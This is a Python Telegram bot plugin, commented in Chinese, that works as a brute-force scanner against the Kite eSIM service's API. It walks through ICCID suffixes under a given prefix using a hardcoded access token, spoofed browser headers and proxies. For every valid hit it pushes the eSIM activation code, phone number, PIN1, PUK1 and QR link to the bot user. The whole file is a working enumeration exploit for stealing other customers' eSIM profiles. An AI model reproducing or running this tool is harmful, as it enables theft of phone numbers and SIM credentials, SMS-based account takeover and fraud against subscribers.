import logging
import asyncio
import html
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, CallbackQueryHandler, MessageHandler, filters

# 导入通用工具
from utils.database import user_manager, ADMIN_ID
from utils.proxy import get_safe_session

logger = logging.getLogger(__name__)

KITESIM_STATE_NONE = 0
KITESIM_STATE_WAIT_INPUT = 1

DEFAULT_TOKEN = "4db3e180bd20f21887b0e27f66a18812"
DEFAULT_PREFIX = "8985224241010049"

class KitesimLogic:
    @staticmethod
    async def run_scan(update: Update, context: ContextTypes.DEFAULT_TYPE, prefix: str, token: str):
        user = update.effective_user
        chat_id = user.id

        # 发送初始状态消息
        status_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"🚀 <b>Kite 扫描任务已启动</b>\n🎯 前缀: <code>{prefix}</code>\n⏳ 正在初始化环境...",
            parse_mode='HTML'
        )

        # 获取配置好的代理 Session
        session = await asyncio.get_running_loop().run_in_executor(
            None, lambda: get_safe_session(test_url="https://api.kitesim.co", timeout=10)
        )

        session.headers.update({
            "token": token,
            "Content-Type": "application/json",
            "Origin": "https://h5.kitesim.co",
            "Referer": "https://h5.kitesim.co/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })

        api_url = "https://api.kitesim.co/esim/getEsimRtQrcodeUrlV1"
        interval = 0.6  # 600ms 间隔
        current_num = 0
        end_suffix = 9999
        hits = 0

        try:
            while current_num <= end_suffix:
                # 检查是否被手动终止
                if context.user_data.get('kitesim_cancel_flag'):
                    await status_msg.edit_text(f"🛑 <b>扫描已手动终止</b>\n🎯 前缀: <code>{prefix}</code>\n📊 停止于: {current_num}/9999\n💡 发现数量: {hits}", parse_mode='HTML')
                    break

                suffix_str = str(current_num).zfill(4)
                iccid = f"{prefix}{suffix_str}"
                payload = {"iccid": iccid}

                # 封装请求以避免异步执行时传参报错
                def do_req():
                    return session.post(api_url, json=payload, timeout=10)

                try:
                    resp = await asyncio.get_running_loop().run_in_executor(None, do_req)

                    if resp.status_code == 200:
                        res_json = resp.json()
                        # 命中成功条件
                        if res_json.get("code") == 200 and res_json.get("data", {}).get("resultCode") == "00":
                            hits += 1
                            data = res_json.get("data", {})

                            # 将扫描结果直接发送给用户
                            result_msg = (
                                f"🎉 <b>发现有效 Kite eSIM！</b>\n\n"
                                f"🆔 <b>ICCID</b>: <code>{iccid}</code>\n"
                                f"📡 <b>LPA 安装代码</b>:\n<code>{html.escape(data.get('acString', ''))}</code>\n\n"
                                f"📱 <b>手机号</b>: <code>{html.escape(data.get('msisdn', ''))}</code>\n"
                                f"🔒 <b>PIN1</b>: <code>{html.escape(data.get('pin1', ''))}</code> | <b>PUK1</b>: <code>{html.escape(data.get('puk1', ''))}</code>\n"
                                f"🔗 <b>QR Code</b>: <a href=\"{html.escape(data.get('qrcodeUrl', ''))}\">点击查看图片</a>"
                            )
                            await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode='HTML', disable_web_page_preview=False)

                            # 核心逻辑：触发跳段机制
                            jump_to = (current_num // 10) * 10 + 10
                            logger.info(f"[*] 触发跳段机制: {current_num:04d} -> {jump_to:04d}")
                            
                            if jump_to > end_suffix:
                                break
                                
                            current_num = jump_to
                            await asyncio.sleep(interval)
                            continue  # 跳过下方的默认 +1
                        else:
                            current_num += 1
                    else:
                        current_num += 1
                except Exception as e:
                    # 忽略超时或解析错误，继续扫下一个
                    current_num += 1

                # 每扫 100 个号码（约 1 分钟）更新一次进度面板，防止触发 TG 的限流
                if current_num % 100 == 0 and current_num <= end_suffix:
                    try:
                        await status_msg.edit_text(
                            f"⏳ <b>爆破扫描进行中...</b>\n"
                            f"🎯 前缀: <code>{prefix}</code>\n"
                            f"📊 进度: {current_num}/9999 (约 {(current_num/10000)*100:.1f}%)\n"
                            f"💡 发现数量: {hits}\n"
                            f"<i>提示：此过程可能需要 1.5 小时，结果会自动推送到此处。</i>",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 停止扫描", callback_data="kitesim_stop")]]),
                            parse_mode='HTML'
                        )
                    except:
                        pass

                # 不阻塞事件循环，严格遵守 600ms 间隔
                await asyncio.sleep(interval)

            # 正常跑完的情况
            if current_num > end_suffix and not context.user_data.get('kitesim_cancel_flag'):
                await status_msg.edit_text(f"✅ <b>号段扫描彻底完成</b>\n🎯 前缀: <code>{prefix}</code>\n💡 最终发现数量: {hits}", parse_mode='HTML')

        except Exception as e:
            logger.error(f"Kite Scan Error: {traceback.format_exc()}")
            await context.bot.send_message(chat_id=chat_id, text=f"💥 <b>扫描异常中止</b>: <code>{html.escape(str(e))}</code>", parse_mode='HTML')
        finally:
            # 任务结束，重置状态
            context.user_data['kitesim_scanning'] = False
            context.user_data['kitesim_cancel_flag'] = False


# ================= 交互处理 =================

async def kitesim_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kite 扫描器入口菜单"""
    user = update.effective_user
    context.user_data['kitesim_state'] = KITESIM_STATE_NONE
    
    if not user_manager.is_authorized(user.id):
        await update.callback_query.answer("🚫 无权访问。", show_alert=True)
        return

    if not user_manager.get_plugin_status("kitesim") and str(user.id) != str(ADMIN_ID):
        await update.callback_query.edit_message_text("🛑 <b>该功能目前维护中</b>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 返回", callback_data="main_menu_root")]]), parse_mode='HTML')
        return

    is_scanning = context.user_data.get('kitesim_scanning', False)

    text = (
        f"🪁 <b>Kite eSIM 爆破扫描器</b>\n"
        f"状态: {'🟢 正在后台扫描中...' if is_scanning else '✅ 就绪'}\n\n"
        f"此工具将自动遍历 0000-9999 的后缀，触发跳段机制，一旦命中将立即通过机器人推送安装代码。"
    )
    
    keyboard = []
    if is_scanning:
        keyboard.append([InlineKeyboardButton("🛑 停止当前扫描", callback_data="kitesim_stop")])
    else:
        keyboard.append([InlineKeyboardButton(f"🚀 运行默认扫描 ({DEFAULT_PREFIX})", callback_data="kitesim_start_default")])
        keyboard.append([InlineKeyboardButton("📝 自定义 ICCID 前缀", callback_data="kitesim_start_custom")])
        
    keyboard.append([InlineKeyboardButton("🔙 返回主菜单", callback_data="main_menu_root")])
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

async def kitesim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    data = query.data

    if not user_manager.is_authorized(user.id): return
    if not user_manager.get_plugin_status("kitesim") and str(user.id) != str(ADMIN_ID): return

    if data == "kitesim_start_default":
        if context.user_data.get('kitesim_scanning'):
            await query.answer("⚠️ 已经有一个扫描任务在运行中！", show_alert=True)
            return
            
        user_manager.increment_usage(user.id, user.first_name)
        context.user_data['kitesim_scanning'] = True
        context.user_data['kitesim_cancel_flag'] = False
        await query.answer()
        
        # 启动后台任务
        asyncio.create_task(KitesimLogic.run_scan(update, context, DEFAULT_PREFIX, DEFAULT_TOKEN))

    elif data == "kitesim_start_custom":
        await query.answer()
        context.user_data['kitesim_state'] = KITESIM_STATE_WAIT_INPUT
        await query.edit_message_text(
            "📝 <b>请输入要扫描的 16 位 ICCID 前缀：</b>\n"
            "例如: <code>8985224241010049</code>\n\n"
            "<i>(高级用法：你可以输入 `前缀 自定义Token` 来同时指定 Token)</i>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 取消", callback_data="plugin_kitesim_entry")]]),
            parse_mode='HTML'
        )

    elif data == "kitesim_stop":
        if context.user_data.get('kitesim_scanning'):
            context.user_data['kitesim_cancel_flag'] = True
            await query.answer("指令已接收！正在安全终止循环...", show_alert=True)
        else:
            await query.answer("当前没有运行中的任务", show_alert=True)

async def kitesim_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理用户输入的自定义前缀"""
    state = context.user_data.get('kitesim_state', KITESIM_STATE_NONE)
    if state == KITESIM_STATE_WAIT_INPUT:
        text = update.message.text.strip()
        user = update.effective_user
        
        parts = text.split()
        prefix = parts[0]
        token = parts[1] if len(parts) > 1 else DEFAULT_TOKEN
        
        # 简单的格式校验
        if not prefix.isdigit() or len(prefix) < 10:
            await update.message.reply_text("⚠️ 前缀格式似乎不对，请输入纯数字（推荐 16 位）：")
            return
            
        context.user_data['kitesim_state'] = KITESIM_STATE_NONE
        
        if context.user_data.get('kitesim_scanning'):
            await update.message.reply_text("⚠️ 已经有一个扫描任务在运行中，请先停止它！")
            return
            
        user_manager.increment_usage(user.id, user.first_name)
        context.user_data['kitesim_scanning'] = True
        context.user_data['kitesim_cancel_flag'] = False
        
        await update.message.reply_text(f"✅ 已确认自定义前缀，即将启动任务。")
        asyncio.create_task(KitesimLogic.run_scan(update, context, prefix, token))

def register_handlers(application):
    application.add_handler(CallbackQueryHandler(kitesim_callback, pattern="^kitesim_.*"))
    application.add_handler(CallbackQueryHandler(kitesim_menu, pattern="^plugin_kitesim_entry$"))
    # 使用 group=3 防止与其他插件的输入处理器冲突
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), kitesim_text_handler), group=3)
    print("🔌 Kite eSIM 爆破扫描插件已加载")
